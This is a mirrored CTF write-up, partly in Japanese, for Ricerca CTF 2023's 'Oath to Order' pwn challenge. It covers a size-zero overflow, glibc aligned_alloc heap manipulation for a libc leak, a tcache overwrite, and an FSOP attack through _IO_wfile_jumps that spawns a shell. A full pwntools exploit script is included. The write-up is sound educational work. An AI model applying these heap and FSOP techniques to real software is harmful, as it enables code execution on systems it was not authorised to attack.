# 【pwn61.0】Oath to Order – Ricerca CTF 2023

> 原文: https://www.ctfiot.com/111898.html
> ID: 111898

1. イントロ

Hey yo, おれの名前はMC NEET、悪そうなやつはだいたい悪い。

さて、久しぶりにCTFに出たのでCTFの記事を書きます。 まぁ解けなかったので、他の人のwriteupを見て写経です。楽しいね。 題材はRicerca CTF 2023のOath to Order。全然関係ないんですが、ぼくは未だにRicercaのスペルを調べないで書けたことがありません。どう頑張ってもRichelcaって書いちゃう。誰か良い覚え方があったら教えてください。

2. Challenge Analysis

The challenge is a simple note allocator, where

We can allocate up to NOTE_LEN(== 10) notes, with each note can have up to NOTE_SIZE(== 300) bytes.

We can NOT free allocated notes.

We can NOT edit allocated notes.

We can specify an index of note to write to. We can write to the same note multiple times, but new allocation is performed everytime.

Allocation is done by aligned_alloc(align, size), where we can specify align smaller than NOTE_SIZE.

The most curious thing is that notes are allocated by aligned_alloc. I will briefly introduce this function later in this post.

3. Vulnerability

Actually, I couldn’t find out the vuln in the program at first glance. So I wrote simple fuzzer and hanged out. When I go back home, the fuzzer crashed when align == 0x100 and size == 0. Okay, this is a vuln:

c

void getstr(char *buf, unsigned size) {

while (–size) {

if (read(STDIN_FILENO, buf, sizeof(char)) != sizeof(char))

exit(1);

else if (*buf == ‘\n’)

break;

buf++;

}

*buf = ‘\0’;

}

When size is zero, we can input data of arbitrary size.

4. Understanding aligned_alloc to leak libcbase

aligned_alloc is a function to allocate memory at specified alignment. Below is a simple flow to allocate a memory:

If align is smaller than MALLOC_ALIGNMENT (==0x10 in many env), just call __libc_malloc(). Note that calling __libc_malloc is a little bit important later.

If align is not a power of 2, round up to the next power of 2. (I think this violates POSIX standard, but no worry this is glibc)

Calls __int_memalign(), where __int_malloc() is called for the size of size + align, which is the worst case of an alignment mismatche.

Find the aligned spot in allocated chunk, and split the chunk into three. The first and the third is freed, then the second is returned.

This is a pretty simplified explanation, but it’s enough to solve this chall.

5. Heap Puzzle: Leak libcbase by freeing alloced fastbin

First, we allocate a chunk with alignment 0xF0 and size 0:

py

create(0, 0xF0, 0, b”A”*0x10 + p64(0xF0) + p32(0x40))

Note that when we call aligned_alloc with size 0, it allocates minimum size of chunk, which is 0x20. Right after the allocation, heap looks as follows:

txt

# Chunk A (fastbin, last_remainder)

0x5581b77ee000: 0x0000000000000000 0x00000000000000f1

0x5581b77ee010: 0x00007f1773219ce0 0x00007f1773219ce0

0x5581b77ee020: 0x0000000000000000 0x0000000000000000

0x5581b77ee030: 0x0000000000000000 0x0000000000000000

0x5581b77ee040: 0x0000000000000000 0x0000000000000000

0x5581b77ee050: 0x0000000000000000 0x0000000000000000

0x5581b77ee060: 0x0000000000000000 0x0000000000000000

0x5581b77ee070: 0x0000000000000000 0x0000000000000000

0x5581b77ee080: 0x0000000000000000 0x0000000000000000

0x5581b77ee090: 0x0000000000000000 0x0000000000000000

0x5581b77ee0a0: 0x0000000000000000 0x0000000000000000

0x5581b77ee0b0: 0x0000000000000000 0x0000000000000000

0x5581b77ee0c0: 0x0000000000000000 0x0000000000000000

0x5581b77ee0d0: 0x0000000000000000 0x0000000000000000

0x5581b77ee0e0: 0x0000000000000000 0x0000000000000000

# Chunk B (alloced)

0x5581b77ee0f0: 0x00000000000000f0 0x0000000000000020

0x5581b77ee100: 0x4141414141414141 0x4141414141414141

# Chunk C (fastbin)

0x5581b77ee110: 0x00000000000000f0 0x0000000000000040 # OVERWRITTEN

0x5581b77ee120: 0x00000005581b77ee 0x0000000000000000

0x5581b77ee130: 0x0000000000000000 0x0000000000000000

0x5581b77ee140: 0x0000000000000000 0x0000000000000000

# Top

0x5581b77ee150: 0x0000000000000000 0x0000000000020eb1

We overwrote C’s header with prev_size = 0xF0 and size = 0x40. Obviously, prev_size is invalid for now, but becomes valid later.

Then, we allocate chunks in Chunk A:

py

create(1, 0, 0, b”B”*0x18 + p32(0xF1))

Heap looks as follows:

txt

# Chunk A1 (alloced)

0x560d76401000: 0x0000000000000000 0x0000000000000021

0x560d76401010: 0x4242424242424242 0x4242424242424242

# Chunk A2 (unsorted) (system assumes A2+B is a single chunk with size 0xF0)

0x560d76401020: 0x4242424242424242 0x00000000000000f1 # OVERWRITTEN

0x560d76401030: 0x00007fcf2c019ce0 0x00007fcf2c019ce0

0x560d76401040: 0x0000000000000000 0x0000000000000000

0x560d76401050: 0x0000000000000000 0x0000000000000000

0x560d76401060: 0x0000000000000000 0x0000000000000000

0x560d76401070: 0x0000000000000000 0x0000000000000000

0x560d76401080: 0x0000000000000000 0x0000000000000000

0x560d76401090: 0x0000000000000000 0x0000000000000000

0x560d764010a0: 0x0000000000000000 0x0000000000000000

0x560d764010b0: 0x0000000000000000 0x0000000000000000

0x560d764010c0: 0x0000000000000000 0x0000000000000000

0x560d764010d0: 0x0000000000000000 0x0000000000000000

0x560d764010e0: 0x0000000000000000 0x0000000000000000

# Chunk B (alloced)

0x560d764010f0: 0x00000000000000d0 0x0000000000000020

0x560d76401100: 0x4141414141414141 0x4141414141414141

# Chunk C (fastbin)

0x560d76401110: 0x00000000000000f0 0x0000000000000040

0x560d76401120: 0x0000000560d76401 0x0000000000000000

0x560d76401130: 0x0000000000000000 0x0000000000000000

0x560d76401140: 0x0000000000000000 0x0000000000000000

# [!] tcache

0x560d76401150: 0x0000000000000000 0x0000000000000291

0x560d76401160: 0x0000000000000000 0x0000000000000000

Chunk A1 and A2 are allocated from Chunk A. We overwrote A2’s header with size = 0xF0 and prev_in_use set. Now, prev_size of Chunk C became valid, which means that A2+B becomes a valid prev chunk of C.

Finally, we allocate a chunk of size 0xD0, which is allocated from A2+B in unsorted bins:

py

create(2, 0, 0xC0, “C” * 0x20)

This is where the magic happens. Heap looks as follows:

txt

# Chunk A1 (alloced)

0x55942f65c000: 0x0000000000000000 0x0000000000000021

0x55942f65c010: 0x4242424242424242 0x4242424242424242

# Chunk A2A (alloced)

0x55942f65c020: 0x4242424242424242 0x00000000000000d1

0x55942f65c030: 0x4343434343434343 0x4343434343434343

0x55942f65c040: 0x4343434343434343 0x4343434343434343

0x55942f65c050: 0x0000000000000000 0x0000000000000000

0x55942f65c060: 0x0000000000000000 0x0000000000000000

0x55942f65c070: 0x0000000000000000 0x0000000000000000

0x55942f65c080: 0x0000000000000000 0x0000000000000000

0x55942f65c090: 0x0000000000000000 0x0000000000000000

0x55942f65c0a0: 0x0000000000000000 0x0000000000000000

0x55942f65c0b0: 0x0000000000000000 0x0000000000000000

0x55942f65c0c0: 0x0000000000000000 0x0000000000000000

0x55942f65c0d0: 0x0000000000000000 0x0000000000000000

0x55942f65c0e0: 0x0000000000000000 0x0000000000000000

# Chunk A2B(==B) (alloced AND fastbin)

0x55942f65c0f0: 0x00000000000000d0 0x0000000000000021

0x55942f65c100: 0x00007f5eb0e19ce0 0x00007f5eb0e19ce0

# Chunk C (fastbin)

0x55942f65c110: 0x0000000000000020 0x0000000000000040

0x55942f65c120: 0x000000055942f65c 0x0000000000000000

0x55942f65c130: 0x0000000000000000 0x0000000000000000

0x55942f65c140: 0x0000000000000000 0x0000000000000000

# [!] tcache

0x55942f65c150: 0x0000000000000000 0x0000000000000291

0x55942f65c160: 0x0000000000000000 0x0000000000000000

Chunk is allocated from unsorted bins and it mistakenly assumes that the size is 0xF0, which We overwrote with. Therefore, Chunk B is freed and connected to fastbin, though it is still in use for notes. We can leak the addr of unsortedbin via fd by reading the note[0]. We got a libcbase.

Overwriting tcache directly for AAW

You may notice that I wrote [!] tcache in the heap layout. tcache is allocated in the middle of chunks in the above layout. This is because tcache is initialized when __libc_malloc is called first time. Remember that we first call aligned_alloc with align = 0xF0 and then with align = 0x0. When we call aligned_alloc with enough align value, it directly calls _int_malloc, which does NOT initialize tcache. This is a good news, because we can easily overwrite tcache in the middle of heap by the overflow.

py

# counts

tcache = p16(1) # count of size=0x20 to 1

tcache = tcache.ljust(0x80, b”\x00″) # set other counts to 0

# entries

tcache += p64(io_stderr)

create(3, 0, 0, b”D”*0x58 + p64(0x291) + tcache)

We set counts of size = 0x20 to 1, and entries of the size to _IO_2_1_stderr_. Yes we have to do FSOP.

bins

6. FSOP: abusing wfile vtable

TBH, i’m totally stranger around FSOP of latest glibc. So I searched for some writeups and found good articles:

https://blog.kylebot.net/2022/10/22/angry-FSROP/

https://ctftime.org/writeup/34812

https://nasm.re/posts/onceforall/

https://github.com/nobodyisnobody/write-ups/tree/main/Hack.lu.CTF.2022/pwn/byor

Plainly speaking, calls to funcs in vtable _wide_vtable, which is invoked in funcs in _IO_wfile_jumps, are not supervised. So my approach is:

Target is __IO_2_1_stderr_ (hereinafter called stderr).

Overwrite stderr._wide_data._wide_vtable to point to somewhere we can write to.

Overwrite stderr._vtable from _IO_file_jumps to _IO_wfile_jumps.

Call stderr._vtable.__overflow == _IO_wfile_overflow to invoke call to stderr._wide_data._wide_vtable.__doallocate.

__overflow is called when glibc is exiting. glibc calls _IO_cleanup(), where __IO_flush_all_lockp() is called:

c

_IO_flush_all_lockp (int do_lock)

{

int result = 0;

FILE *fp;

…

for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain)

{

…

if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)

|| (_IO_vtable_offset (fp) == 0

&& fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr

> fp->_wide_data->_IO_write_base))

)

&& _IO_OVERFLOW (fp, EOF) == EOF)

result = EOF;

…

}

…

}

We can read some restriction of stderr from this code to reach _IO_OVERFLOW:

_mode must be larger than 0

_wide_data->_IO_write_ptr must be greater than _wide_data->_IO_write_base

Then, _IO_wfile_overflow is called:

c

wint_t

_IO_wfile_overflow (FILE *f, wint_t wch)

{

if (f->_flags & _IO_NO_WRITES) /* SET ERROR */

{

…

return WEOF;

}

/* If currently reading or no buffer allocated. */

if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0)

{

/* Allocate a buffer if needed. */

if (f->_wide_data->_IO_write_base == 0)

{

_IO_wdoallocbuf (f);

…

}

else

…

Additional restriction of stderr:

_flags & _IO_NO_WRITES(=0x8) must be 0

_flags & _IO_CURRENTLY_PUTTING(0x800) must be 0

_wide_data->_IO_write_base must be NULL

Finally, _IO_wdoallocbuf is called:

c

void

_IO_wdoallocbuf (FILE *fp)

{

if (fp->_wide_data->_IO_buf_base)

return;

if (!(fp->_flags & _IO_UNBUFFERED))

if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)

return;

…

}

Final restriction:

_flags & _IO_UNBUFFERED(0x2) must be 0

To fulfill all the conditions, we can overwrite stderr and following stdout as below:

py

# Overwrite _IO_2_1_stderr_

# flags

# – & _IO_NO_WRITES(0x2): must be 0

# – & _IO_UNBUFFERED(0x8): must be 0

# To fulfill this condition, we just use spaces(0x20) before /bin/sh

payload = b” “ * 8 + b”/bin/sh\x00″ # flags

payload += p64(0x0) * int((0x90/8 – 1))

payload += p64(0) # cvt

payload += p64(io_stdout + 0x20) # wide_data

payload += p64(0) * 3

payload += p32(1)

payload += b”\x00″*0x14

payload += p64(io_wfile_jumps)

## stdout (== stderr->_wide_data)

payload += p64(0) * 4 # becomes wide_vtable

payload += p64(0) * 3 # read

payload += p64(0) # write_base: must be NULL

payload += p64(0x10) # write_ptr

payload += p64(0x0) # write_end

payload += p64(0x0) # buf_base

payload += p64(system) * 4 # becomes wide_vtable->doalloc

payload += p64(0) * 2 # state

payload += p64(0) * int(0x70/8) # codecvt

payload += p64(io_stdout) * 10 # wide_vtable

create(4, 0, 0, payload)

We use stdout as a buffer for _wide_data (, and entries of fake vtable). In this challenge, IO is performed by read/write calls. So these FILE structure can be tampered. As a sidenote, stderr is the first entry of the chain of FILE structures, so we have to pay no attention to stdout and stdin at all :). When we call wide_vtable.__doallocate, which is overwritten with system(), RDI is fp, which is stderr in this case. So we wanna place the string /bin/sh\x00 at the start of stderr. However, here is a _flag and it has some restrictions stated above. And the string doesn’t match the condition. No worry. We can just prefix the /bin/sh\x00 with 8 spaces(0x20), then all conditions are fulfilled. Space is a great character for FSOP!

7. Full Exploit

https://github.com/smallkirby/pwn-writeups/blob/master/ricerca2023/oath-to-order/exploit.py

py

#!/usr/bin/env python

#encoding: utf-8;

from pwn import *

import sys

FILENAME = “chall”

LIBCNAME = “”

hosts = (“oath-to-order.2023.ricercactf.com”,“localhost”,“localhost”)

ports = (9003,12300,23947)

rhp1 = {‘host’:
hosts[0],‘port’:
ports[0]} #for actual server

rhp2 = {‘host’:
hosts[1],‘port’:
ports[1]} #for localhost

rhp3 = {‘host’:
hosts[2],‘port’:
ports[2]} #for localhost running on docker

context(os=‘linux’,arch=‘amd64’)

binf = ELF(FILENAME)

libc = ELF(LIBCNAME) if LIBCNAME!=“” else None

## utilities #########################################

def create(ix: int, align: int, size: int, data: str):

global c

print(f”[CREATE] ix:{ix}, align:{align}, size:{size}, datalen:{len(data)}“)

print(c.recvuntil(“1. Create”))

c.sendlineafter(“> “, b”1″)

c.sendlineafter(“index: “,str(ix))

if “inv” in str(c.recv(4)):

return

c.sendlineafter(“: “, str(size))

if “inv” in str(c.recv(4)):

return

c.sendlineafter(“: “, str(align))

if “inv” in str(c.recv(4)):

return

if ‘\n’ in str(data):

c.sendlineafter(“: “, str(data).split(‘\n’)[0])

elif (len(data) == size – 1) and (size != 0) and (len(data) != 0):

c.sendafter(“: “, data)

elif (len(data) >= size and size != 0):

c.sendafter(“: “, data[:
size-1])

else:

c.sendlineafter(“: “, data)

def show(ix: int):

global c

print(f”[SHOW] ix:{ix}“)

print(c.recvuntil(“1. Create”))

c.sendlineafter(“> “, b”2″)

c.sendlineafter(“index: “, str(ix))

def quit():

global c

c.sendlineafter(“> “, “3”)

c.interactive()

def wait():

input(“WAITING INPUT…”)

## exploit ###########################################

def exploit():

global c

# Alloc 3 chunks

# – A: freed(fast), size=0xF0, align=0x0

# – B: alloced , size=0x20, align=0xF0

# – C: freed(fast), size=0x40, align=0x110

# Then overwrite C’s header with prev_size=0xF0, prev_in_use=false

# Chunk refered by prev_size is allocated later.

create(0, 0xF0, 0, b”A”*0x10 + p64(0xF0) + p32(0x40))

# Alloc 2 chunks, using fastbin(A)

# – A1: alloced, size=0x20, align=0x0

# – A2: freed(unsorted), size=0xD0, align=0x20

# Then overwrite A2’s header with 0xF1, which is same with C’s prev_size.

# A2 becomes valid prev chunk of C.

#

# Note that this is the first time to call __libc_malloc,

# where tcache is initialized in chunk of size 0x290, because

# – memalign with too small align: calls `__libc_malloc`

# – normal memalign: calls `__int_memalign`, where `_int_malloc` is directly called

# Therefore, tcache is initialized right after chunk C.

create(1, 0, 0, b”B”*0x18 + p32(0xF1))

# Alloc 2 chunks, using unsortedbin (A2)

# A2 is the only chunk in unsortedbin and is a last_remainder,

# so it is split into 2 chunks.

# – A2A: alloced, size=0xD0, align=0x20

# – A2B: freed(unsorted), size=0xF0

# A2B is identical to B. Its fd and bk is overwritten with unsortedbin’s addr.

create(2, 0, 0xC0, “C” * 0x20)

# Leak unsortedbin addr via fd of B(==A2B)

show(0)

unsorted = u64(c.recv(6).ljust(8, b”\x00″))

print(“[+] unsorted bin: “ + hex(unsorted))

printf = unsorted – 0x1b9570

libcbase = printf – 0x60770

print(“[+] libc base: “ + hex(libcbase))

system = libcbase + 0x50d60

io_stderr = libcbase + 0x21a6a0

io_stdout = io_stderr + 0xE0

io_wfile_jumps = libcbase + 0x2160c0

main_arena = libcbase + 0x219c80

print(“[+] system: “ + hex(system))

print(“[+] _IO_2_1_stderr_: “ + hex(io_stderr))

print(“[+] main_arena: “ + hex(main_arena))

# Overwrite tcache in heap right after C.

# counts

tcache = p16(1) # count of size=0x12 to 1

tcache = tcache.ljust(0x80, b”\x00″) # set other counts to 0

# entries

tcache += p64(io_stderr)

create(3, 0, 0, b”D”*0x58 + p64(0x291) + tcache)

# Overwrite _IO_2_1_stderr_

# flags

# – & _IO_NO_WRITES(0x2): must be 0

# – & _IO_UNBUFFERED(0x8): must be 0

# To fulfill this condition, we just use spaces(0x20) before /bin/sh

payload = b” “ * 8 + b”/bin/sh\x00″ # flags

payload += p64(0x0) * int((0x90/8 – 1))

payload += p64(0) # cvt

payload += p64(io_stdout + 0x20) # wide_data

payload += p64(0) * 3

payload += p32(1)

payload += b”\x00″*0x14

payload += p64(io_wfile_jumps)

## stdout (== stderr->_wide_data)

payload += p64(0) * 4 # becomes wide_vtable

payload += p64(0) * 3 # read

payload += p64(0) # write_base: must be NULL

payload += p64(0x10) # write_ptr

payload += p64(0x0) # write_end

payload += p64(0x0) # buf_base

payload += p64(system) * 4 # becomes wide_vtable->doalloc

payload += p64(0) * 2 # state

payload += p64(0) * int(0x70/8) # codecvt

payload += p64(io_stdout) * 10 # wide_vtable

create(4, 0, 0, payload)

quit() # invoke _IO_wfile_overflow in _IO_all_lockp

c.interactive()

## main ##############################################

if __name__ == “__main__”:

global c

if len(sys.argv)>1:

if sys.argv[1][0]==“d”:

cmd = “””

set follow-fork-mode parent

“””

c = gdb.debug(FILENAME,cmd)

elif sys.argv[1][0]==“r”:

c = remote(rhp1[“host”],rhp1[“port”])

#s = ssh(‘’, ‘<HOST>’, password='’)

#c = s.process(executable='’)

elif sys.argv[1][0]==“v”:

c = remote(rhp3[“host”],rhp3[“port”])

else:

c = remote(rhp2[‘host’],rhp2[‘port’])

exploit()

c.interactive()

8. アウトロ

RicSec

いや〜〜、めちゃくちゃパズルで最高ですね。scanf/printfじゃなくてread/writeを使ってたのは、stdoutをぐちゃぐちゃにしてもいいようになのかな。 最近のglibc FSOP周りを全然知らなかったので、とても勉強になりました。これを機にCTF再開しようかなと思えるくらいには楽しかったです。

あと余談なんですが、再来週に人生初飛行機に乗ってイタリアに行かなくちゃいけないので、その前に遺書を書かなくちゃなぁと思っています。

9. Refs

Shift Crops’ Writeup

原文始发于smallkirby：【pwn61.0】Oath to Order – Ricerca CTF 2023